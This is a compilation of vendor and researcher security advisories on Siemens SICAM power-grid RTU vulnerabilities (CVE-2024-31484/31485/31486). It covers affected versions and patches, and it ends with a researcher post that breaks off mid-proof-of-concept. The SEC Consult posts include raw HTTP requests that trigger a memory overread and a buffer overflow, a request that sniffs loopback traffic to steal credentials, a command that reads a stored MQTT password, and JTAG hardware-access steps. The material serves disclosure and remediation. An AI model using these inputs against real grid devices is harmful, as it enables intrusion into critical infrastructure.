=== Content from cert-portal.siemens.com_6e2726c8_20250111_071121.html ===


Siemens Security Advisory by Siemens ProductCERT

SSA-871704: Multiple Vulnerabilities in SICAM Products

| Publication Date: | 2024-05-14 |
| --- | --- |
| Last Update: | 2024-06-11 |
| Current Version: | V1.1 |
| CVSS v3.1 Base Score: | 7.8 |
| CVSS v4.0 Base Score: | 8.6 |

SUMMARY

Multiple SICAM products are affected by vulnerabilities that could lead to privilege escalation, remote code execution or information loss namely:

* SICAM A8000 device firmwares

  + CPC80 for CP-8000/CP-8021/CP-8022
  + CPCI85 and OPUPI0 for CP-8031/CP-8050
* SICAM EGS firmware

  + CPCI85 and OPUPI0
* SICAM 8 Software Solution

  + SICORE

Siemens has released new versions for the affected firmwares and recommends to update to the latest versions.

AFFECTED PRODUCTS AND SOLUTION

[Un-/Collapse All](#/)

| Affected Product and Versions | Remediation |
| --- | --- |
| CPC80 Central Processing/Communication  All versions < V16.41 affected by CVE-2024-31484   [CVE-2024-31484](#cve-2024-31484) | Update to V16.41 or later version.  The firmware CPC80 V16.41 is present within “CP-8000/CP-8021/CP-8022 Package” V16.41  <https://support.industry.siemens.com/cs/ww/en/view/109812178/> |
| CPCI85 Central Processing/Communication  All versions < V5.30 affected by CVE-2024-31484,  CVE-2024-31485   [CVE-2024-31484](#cve-2024-31484)  [CVE-2024-31485](#cve-2024-31485) | Update to V5.30 or later version  The firmware CPCI85 V5.30 is present within "CP-8031/CP-8050 Package" V5.30  <https://support.industry.siemens.com/cs/ww/en/view/109804985/> |
| OPUPI0 AMQP/MQTT  All versions < V5.30 affected by CVE-2024-31486   [CVE-2024-31486](#cve-2024-31486) | Update to V5.30 or later version  The firmware OPUPI0 V5.30 is present within "CP-8031/CP-8050 Package" V5.30  <https://support.industry.siemens.com/cs/ww/en/view/109804985/> |
| SICORE Base system  All versions < V1.3.0 affected by CVE-2024-31485   [CVE-2024-31485](#cve-2024-31485) | Update to V1.3.0 or later version  The firmware SICORE V1.3.0 is present within "SICAM 8 Software Solution Package" V5.30  <https://support.industry.siemens.com/cs/ww/en/view/109818240/> |

WORKAROUNDS

AND
MITIGATIONS

Product-specific remediations or mitigations can be found in the section
[Affected Products and Solution](#affected-products-section).

Please follow the [General Security Recommendations](#general-recommendations).

GENERAL SECURITY RECOMMENDATIONS

Operators of critical power systems (e.g. TSOs or DSOs) worldwide are usually required by regulations to build resilience into the power grids by applying multi-level redundant secondary protection schemes. It is therefore recommended that the operators check whether appropriate resilient protection measures are in place. The risk of cyber incidents impacting the grid's reliability can thus be minimized by virtue of the grid design.
Siemens strongly recommends applying the provided security updates using the corresponding tooling and documented procedures made available with the product. If supported by the product, an automated means to apply the security updates across multiple product instances may be used. Siemens strongly recommends prior validation of any security update before being applied, and supervision by trained staff of the update process in the target environment.
As a general security measure Siemens strongly recommends to protect network access with appropriate mechanisms (e.g. firewalls, segmentation, VPN). It is advised to configure the environment according to our operational guidelines in order to run the devices in a protected IT environment.

Recommended security guidelines can be found at:
<https://www.siemens.com/gridsecurity>

PRODUCT DESCRIPTION

SICAM 8 Power automation platform is a universal, hard- and software based, all-in-one solution for all applications in the field of power supply

The SICAM A8000 RTUs (Remote Terminal Units) series is a modular device range for telecontrol and automation applications in all areas of energy supply.

SICAM EGS (Enhanced Grid Sensor) is a gateway for local substations in power distribution grids.

VULNERABILITY DESCRIPTION

[Un-/Collapse All](#/)

This chapter describes all vulnerabilities (CVE-IDs) addressed in this security advisory.
Wherever applicable, it also documents the product-specific impact of the individual vulnerabilities.

Vulnerability CVE-2024-31484

The affected devices contain an improper null termination vulnerability while parsing a specific HTTP header. This could allow an attacker to execute code in the context of the current process or lead to denial of service condition.

| CVSS v3.1 Base Score | 7.8 |
| --- | --- |
| CVSS v3.1 Vector | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| CVSS v4.0 Base Score | 7.3 |
| CVSS v4.0 Vector | CVSS:4.0/AV:L/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N |
| CWE | CWE-170: Improper Null Termination |

Vulnerability CVE-2024-31485

The web interface of affected devices is vulnerable to command injection due to missing server side input sanitation. This could allow an authenticated privileged remote attacker to execute arbitrary code with root privileges.

| CVSS v3.1 Base Score | 7.2 |
| --- | --- |
| CVSS v3.1 Vector | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H |
| CVSS v4.0 Base Score | 8.6 |
| CVSS v4.0 Vector | CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N |
| CWE | CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection') |

Vulnerability CVE-2024-31486

The affected devices stores MQTT client passwords without sufficient protection on the devices. An attacker with remote shell access or physical access could retrieve the credentials leading to confidentiality loss.

| CVSS v3.1 Base Score | 5.3 |
| --- | --- |
| CVSS v3.1 Vector | CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N |
| CVSS v4.0 Base Score | 6.0 |
| CVSS v4.0 Vector | CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N |
| CWE | CWE-312: Cleartext Storage of Sensitive Information |

ACKNOWLEDGMENTS

Siemens thanks the following party for its efforts:

* Steffen Robertz, Gerhard Hechenberger, Stefan Viehböck, and Constantin Schieber-Knöbl from SEC Consult Vulnerability Lab for coordinated disclosure of the vulnerabilities

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the Siemens ProductCERT:

<https://www.siemens.com/cert/advisories>

HISTORY DATA

| V1.0 (2024-05-14): | Publication Date |
| --- | --- |
| V1.1 (2024-06-11): | Added Constantin Schieber-Knöbl and Stefan Viehböck to the acknowledgment |

TERMS OF USE
Siemens Security Advisories are subject to the terms and conditions contained in Siemens’ underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens’ Global Website ([https://www.siemens.com/
terms\_of\_use](https://www.siemens.com/terms_of_use), hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conflicts, the License Terms shall prevail over the Terms of Use.

 SSA-871704
©
Siemens 2024



=== Content from seclists.org_ba95e680_20250111_071120.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20240626-0 :: Multiple Vulnerabilities in Siemens Power Automation Products

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 26 Jun 2024 09:01:43 +0000

---

```

SEC Consult Vulnerability Lab Security Advisory < 20240626-0 >
=======================================================================
              title: Multiple Vulnerabilities in Power Automation Products
            product: Siemens CP-8000/CP-8021/CP8-022/CP-8031/CP-8050/SICORE
 vulnerable version: CPC80 < V16.41 / CPCI85 < V5.30 / OPUPI0 < V5.30 / SICORE < V1.3.0 /
                     CPCX26 < V06.02 for CP-2016 and PCCX26 < V06.05 for CP-2019 in SICAM AK3 /
                     ETA4 < V10.46 and ETA5 < V03.27 for SM-2558 ins SICAM AK3, SICAM BC and SICAM TM
      fixed version: CPC80 V16.41 / CPCI85 V5.30 / OPUPI V5.30 / SICORE V1.3.0 / CPCX26 V06.02 /
                     PCCX26 V06.05 / ETA4 V10.46 / ETA5 V03.27
         CVE number: CVE-2024-31484, CVE-2024-31485, CVE-2024-31486
             impact: high
           homepage: <https://www.siemens.com/global/en/products/energy/energy-automation-and-smart-grid.html>
              found: 2023-04-03 and 2024-01-12
                 by: Stefan Viehboeck (Office Vienna)
                     Steffen Robertz (Office Vienna)
                     Gerhard Hechenberger (Office Vienna)
                     Constantin Schieber-Knoebl (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers."

Source: <https://new.siemens.com/global/en/company/about.html>

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Buffer Overread (Only CP-8000/CP-8021/CP-8022/CP-8031/CP-8050/CPCX26/PCCX26/ETA4/ETA5, CVE-2024-31484)
The webserver running on the CP-8050 and CP-8031 is vulnerable to a buffer overread
vulnerability.

The value of the HTTP header "Session-ID" is processed and used in a "strncpy" call
without proper termination. Thus, data structures from the BSS segment will be
leaked in the response. Attackers might be able to read sensitive data from memory.

2) Privilege Escalation (Only CP-8031/CP-8050 and SICORE devices, CVE-2024-31485)
An attacker with an account with the viewer (or higher) role can intercept unencrypted
traffic of other users of the web interface. Thus, the attacker can intercept higher
privileged user accounts and passwords and might gain access to their accounts to
perform tasks with elevated privileges.

3) Unsafe Storage of MQTT Client Passwords (Only CP-8031/CP-8050, CVE-2024-31486)
A PLC with the OPUPI0 MQTT application installed is able to connect to
an MQTT server. The configured MQTT password for the server is stored
in cleartext on the device and can be read by exploiting a potential
code execution or file disclosure vulnerability or with physical access
to the device.

Proof of concept:
-----------------
1) Buffer Overread (Only CP-8000/CP-8021/CP-8022/CP-8031/CP-8050/CPCX26/PCCX26/ETA4/ETA5, CVE-2024-31484)
The buffer overread can be triggered by sending a "Session-ID" in the HTTP request header
with exactly 20 bytes. This can be done with e.g. this request:

POST /SICAM_TOOLBOX_1703_remote_connection_00.htm HTTP/1.1
User-Agent: SICAM TOOLBOX II
Version: 1
Session-ID: 3814280BA9921c6cAAAA
Sequence-ID: 1
Content-Length: 8
Content-Type: text/plain
KeepAlive: 5
Connection: close
type=3

The server answers with following response:

HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA9921c6cAAAAæk¤
Cache-Control: max-age=0, private
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubdomains
Content-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval'
X-XSS-Protection: 1; mode=block
X-Permitted-Cross-Domain-Policies: none
Content-Length: 71
Connection: close
Date: Wed, 30 Mar 2022 01:38:37 GMT

Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

The Session-ID in the response leaks at least 4 additional bytes. Further,
the structure of the response is broken, as some HTTP headers are suddenly part
of the body.

The vulnerability most likely stems from a misuse of the strncpy function.
The following code segment was analyzed (RTUM85.elf, Offset 0x1d50de):

ptr_fcgi_header = get_fcgi_param(fcgi_struct, "HTTP_SESSION_ID);
if (ptr_fcgi_header == (char*) 0x00) goto LAB_001d4a66;
if ( is_a_session_available == 0 ) {
    strncpy(&session_id, ptr_fcgi_header, 0x14);
}

strncpy is called with a length parameter of 0x14. To trigger the vulnerability,
we are sending exactly 0x14 bytes. Thus, we believe that the global session_id
variable is never properly terminated with a Null-pointer.

libc's documentation even contains a warning for this case:
"If there is no null byte among the first n bytes of src, the string
placed in dest will not be null-terminated."

Thus, if the response is built, every data structure in BSS following the
session_id global will be printed as string until a Null byte is encountered.

2) Privilege Escalation (Only CP-8031/CP-8050 and SICORE devices, CVE-2024-31485)
An attacker with an account with the viewer (or higher) role can intercept unencrypted
traffic of other users of the web interface. Thus, the attacker can intercept higher
privileged user accounts and passwords.

By starting the Ethernet Packet Capture (Home -> Monitoring & Simulation -> Ethernet
Packet Capture), a request is sent. This request can be modified by an interceptor
proxy (e.g. Burp Suite).

POST /sicweb-ajax/rtum85/cview HTTP/1.1
Host: HOST
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
SICWEB-SID: xNG1v825qFmCMo8hpjfISlVARKipW1B+lz9d5FoBxipR87VT
Content-Length: 198
Origin: http:// HOST
Connection: close
Referer: http:// HOST/

<?xml version="1.0" encoding="UTF-8"?>
<Cmd_SetCustomViewValue><view id="packet_capture"><parameter id="p0">
<value>lo</value>
</parameter></view></Cmd_SetCustomViewValue>

The attacker can then send the parameter id p0 to the value "lo" and start the
packet capture in order to dump from the loopback interface. It is a valid
interface, as it only consist of lowercase characters and numbers (fix
for CVE-2023-33919).

However, the webserver implements TLS in a stunnel fashion. It accepts all
TLS traffic on port 443, then decrypts it and forwards it via loopback interface
to port 80. By being able to read the loopback traffic, an attacker can now
see all communication, including passwords of higher privileged users.

3) Unsafe Storage of MQTT Passwords (Only CP-8031/CP-8050, CVE-2024-31486)
To demonstrate the issue, the following parameters were set for the MQTT client
using the Siemens Toolbox II:
* "8 MQTT password" mqtt_pw_sectest
* "9 MQTT username" mqtt_sectest

The password (together with the username) can be located in the
/ies/data/local/system/iescfg.iar file on the device, which can be
retrieved by shell access/code execution on the device or by desoldering
and reading its unencrypted flash memory chip:
-----------------------------------------------------------------------
grep -rain "mqtt_pw_sectest" /ies/data/local/system/iescfg.iar
[...]
mqtt
mqtt_sectest.
mqtt_pw_sectest.
< �MQTT_Broker
[...]
-----------------------------------------------------------------------

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:

Vulnerability 1 and 2 were confirmed on Siemens SICAM A8000 CP-8031 V05.12
Vulnerability 3 was confirmed on Siemens A8000 CP-8050 V04.92

Vendor contact timeline:
------------------------
2023-04-18: Contacting vendor through productcert () siemens com for vulnerability 3
2023-04-19: Advisory will be handled as case #92461.
2023-06-13: Siemens releases advisory for other vulnerabilities, see
<https://sec-consult.com/vulnerability-lab/advisory/multiple-vulnerabilities-siemens-a8000/>
2023-10-09: Requesting status update
2024-04-03: Requesting status update.
2024-04-04: Unsafe Storage of MQTT password: fix will be released in April 2024,
            Siemens advisory scheduled for May 2024
2024-04-11: Contacting vendor through productcert () siemens com for Vulnerability 1 and 2
2024-04-12: Siemens assigned case #68662 for Vulnerability 1,2
2024-05-14: Siemens publishes SSA-871704 for vulnerability 1,2,3
2024-06-11: Siemens publishes SSA-620338 for Vulnerability 1
2024-06-26: Public release of advisory

Solution:
---------
The vendor provides a patch which can be downloaded at the following URLs
depending on the affected device:

CPC80 Central Processing/Communication: The firmware CPC80 V16.41 is present within “CP-8000/CP-8021/CP-8022 Package”
V16.41
<https://support.industry.siemens.com/cs/ww/en/view/109812178/>

CPCI85 Central Processing/Communication: The firmware CPCI85 V5.30 is present within "CP-8031/CP-8050 Package" V5.30
<https://support.industry.siemens.com/cs/ww/en/view/109804985/>

SICORE Base system: The firmware SICORE V1.3.0 is present within "SICAM 8 Software Solution Package" V5.30
<https://support.industry.siemens.com/cs/ww/en/view/109818240/>

OPUPI0 AMQP/MQTT: The firmware OPUPI0 V5.30 is present within "CP-8031/CP-8050 Package" V5.30
<https://support.industry.siemens.com/cs/ww/en/view/109804985/>

CPCX26 Central Processing/Communication: The firmware CPCX26 V06.02 is present within “SICAM RTUs AK3 Package” V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

PCCX26 Ax 1703 PE, Contr, Communication Element: The firmware PCCX26 V06.05 is present within “SICAM RTUs AK3 Package”
V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

ETA4 Ethernet Interface IEC60870-5-104: The firmware ETA4 V10.46 is present within “SICAM RTUs AK3 Package” V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

ETA5 Ethernet Int. 1x100TX IEC61850 Ed.2: The firmware ETA5 V03.27 is present within “SICAM RTUs AK3 Package” V06.02
<https://support.industry.siemens.com/cs/ww/en/view/109813252/>

Additional information from the vendor can be found in their advisories:
<https://cert-portal.siemens.com/productcert/html/ssa-871704.html>
<https://cert-portal.siemens.com/productcert/html/ssa-620338.html>

Workaround:
-----------
Limit network and physical access to the PLC.

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <https://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF Stefan Viehboeck, Steffen Robertz, Gerhard Hechenberger, Constantin Schieber-Knoebl  / @2024

```

**Attachment:
[smime.p7s](att-4/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

### Current thread:

* **SEC Consult SA-20240626-0 :: Multiple Vulnerabilities in Siemens Power Automation Products** *SEC Consult Vulnerability Lab via Fulldisclosure (Jul 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from cert-portal.siemens.com_2da6dc8e_20250111_071121.html ===


Siemens Security Advisory by Siemens ProductCERT

SSA-620338: Buffer Overflow Vulnerability in SICAM AK3 / BC / TM

| Publication Date: | 2024-06-11 |
| --- | --- |
| Last Update: | 2024-06-11 |
| Current Version: | V1.0 |
| CVSS v3.1 Base Score: | 7.8 |
| CVSS v4.0 Base Score: | 7.3 |

SUMMARY

SICAM AK3/TM/BC devices are affected by a buffer overflow vulnerability that could allow an attacker to execute code in the context of the current process or lead to a denial of service condition.

* SICAM AK3 device firmware
  + CPCX26 for CP-2016
  + PCCX26 for CP-2019
* SICAM AK3, SICAM BC and SICAM TM device firmware
  + ETA4 and ETA5 for SM-2558

Siemens has released new firmware versions for the affected products and recommends to update to the latest versions.

AFFECTED PRODUCTS AND SOLUTION

[Un-/Collapse All](#/)

| Affected Product and Versions | Remediation |
| --- | --- |
| CPCX26 Central Processing/Communication  All versions < V06.02 affected by CVE-2024-31484   [CVE-2024-31484](#cve-2024-31484) | Update to V06.02 or later version.  The firmware CPCX26 V06.02 is present within “SICAM RTUs AK3 Package” V06.02  <https://support.industry.siemens.com/cs/ww/en/view/109813252/> |
| ETA4 Ethernet Interface IEC60870-5-104  All versions < V10.46 affected by CVE-2024-31484   [CVE-2024-31484](#cve-2024-31484) | Update to V10.46 or later version  The firmware ETA4 V10.46 is present within “SICAM RTUs AK3 Package” V06.02  <https://support.industry.siemens.com/cs/ww/en/view/109813252/> |
| ETA5 Ethernet Int. 1x100TX IEC61850 Ed.2  All versions < V03.27 affected by CVE-2024-31484   [CVE-2024-31484](#cve-2024-31484) | Update to V03.27 or later version  The firmware ETA5 V03.27 is present within “SICAM RTUs AK3 Package” V06.02  <https://support.industry.siemens.com/cs/ww/en/view/109813252/> |
| PCCX26 Ax 1703 PE, Contr, Communication Element  All versions < V06.05 affected by CVE-2024-31484   [CVE-2024-31484](#cve-2024-31484) | Update to V06.05 or later version  The firmware PCCX26 V06.05 is present within “SICAM RTUs AK3 Package” V06.02  <https://support.industry.siemens.com/cs/ww/en/view/109813252/> |

WORKAROUNDS

AND
MITIGATIONS

Product-specific remediations or mitigations can be found in the section
[Affected Products and Solution](#affected-products-section).

Please follow the [General Security Recommendations](#general-recommendations).

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens recommends to configure the environment according to Siemens' operational guidelines for Industrial Security (Download: <https://www.siemens.com/cert/operational-guidelines-industrial-security>), and to follow the recommendations in the product manuals.
Additional information on Industrial Security by Siemens can be found at: <https://www.siemens.com/industrialsecurity>

PRODUCT DESCRIPTION

SICAM AK 3 is a telecontrol and automation device facilitating the automation of diverse processes across widely distributed systems.

SICAM BC is a bay control device with a standardized communication interface.

SICAM TM is an automation and telecontrol system with a standardized communication interface.

VULNERABILITY DESCRIPTION

[Un-/Collapse All](#/)

This chapter describes all vulnerabilities (CVE-IDs) addressed in this security advisory.
Wherever applicable, it also documents the product-specific impact of the individual vulnerabilities.

Vulnerability CVE-2024-31484

The affected devices contain an improper null termination vulnerability while parsing a specific HTTP header. This could allow an attacker to execute code in the context of the current process or lead to denial of service condition.

| CVSS v3.1 Base Score | 7.8 |
| --- | --- |
| CVSS v3.1 Vector | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| CVSS v4.0 Base Score | 7.3 |
| CVSS v4.0 Vector | CVSS:4.0/AV:L/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N |
| CWE | CWE-170: Improper Null Termination |

ACKNOWLEDGMENTS

Siemens thanks the following party for its efforts:

* Steffen Robertz from SEC Consult Vulnerability Lab for coordinated disclosure of the vulnerability

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the Siemens ProductCERT:

<https://www.siemens.com/cert/advisories>

HISTORY DATA

| V1.0 (2024-06-11): | Publication Date |
| --- | --- |

TERMS OF USE
Siemens Security Advisories are subject to the terms and conditions contained in Siemens’ underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens’ Global Website ([https://www.siemens.com/
terms\_of\_use](https://www.siemens.com/terms_of_use), hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conflicts, the License Terms shall prevail over the Terms of Use.

 SSA-620338
©
Siemens 2024



=== Content from seclists.org_73ad8c96_20250111_071120.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 & CP-2019

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Mon, 25 Nov 2024 08:32:17 +0000

---

```

SEC Consult Vulnerability Lab Security Advisory < 20241125-0 >
=======================================================================
              title: Unlocked JTAG interface and buffer overflow
            product: Siemens SM-2558 Protocol Element (extension module for
                     Siemens SICAM AK3/TM/BC),
                     Siemens CP-2016 & CP-2019
 vulnerable version: JTAG: Unknown HW revision, Zynq Firmware Version 10A45
                     Buffer overflow: <V10.46 (ETA4), <V03.27 (ETA5),
                     <V06.02 (CPCX26), <V06.05 (PCCX26)
      fixed version: JTAG: SM-2558 hardware is EOL
                     Buffer overflow: V06.02 (CPCX26), V10.46 (ETA4),
                     V03.27 (ETA5), V06.05 (PCCX26)
             impact: High
           homepage: <https://www.siemens.com>
              found: 2023-07-11
                 by: Stefan Viehböck (Office Linz)
                     Constantin Schieber-Knöbl (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers."

Source: <https://new.siemens.com/global/en/company/about.html>

Business recommendation:
------------------------
Upgrade to the latest firmware version to mitigate the buffer overflow.

The hardware (SM-2558) is considered end of life (EOL), thus no new
version with a fixed JTAG will be released. Restrict physical access
to the device.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface can be accessed with physical access to the PCB.
After slightly modifying the hardware it is possible to connect to
the interface with full access to the communication module.

2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 & CP-2019 (CVE-2024-31484)
The webserver running on the SM-2558 device as well as CP-2016 and CP-2019
is vulnerable to a buffer overflow vulnerability.

The value of the HTTP header "Session-ID" is processed and used in an
"sprintf" call without proper length checking. The target buffer is in the
BSS segment and likely 1024 bytes in length. The buffer overflows into several
other global data structures.

Proof of concept:
-----------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface pins (TDI, TDO, TCK, TMS, GND) are accessible on a populated
20-pin header on the PCB (see [figure_1]).

A removed connection needs to be restored by soldering an additional wire
between two exposed contacts (see [figure_2]), as the JTAG interface of the
Zynq-7000 is daisy-chained with the JTAG interface of the Broadcom BCM53101M
Ethernet controller. The pad in question connects to pin A57 (TDI) of the Ethernet
controller. After connecting to the pins, a connection to the Zynq-7000 JTAG
interface is possible. E.g., memory can be dumped ([figure_5]), execution can be
single stepped  ([figure_4]) or halted ([figure_3]), and variables changed.
This grants an attacker with physical access full control of the communication
module.

2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 & CP-2019 (CVE-2024-31484)
The vulnerability can be triggered with a HTTP POST request similar to the
following one:

POST /SICAM_TOOLBOX_1703_remote_connection_01.htm HTTP/1.1
User-Agent: SICAM TOOLBOX II
Version: 1
Session-ID: 3814280BA9922f30_BOF_PAYLOAD_HERE
Sequence-ID: 525
Content-Length: 54
Content-Type: text/plain
KeepAlive: 5
Connection: close

type=1&length=15&data=0780640202fef1e60000feff0100c2

Here are a few observations with different Session-ID values:

a) Session ID value 3814280BA9922f30 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd0
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

b) Session ID value 3814280BA992fd00000000000000 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
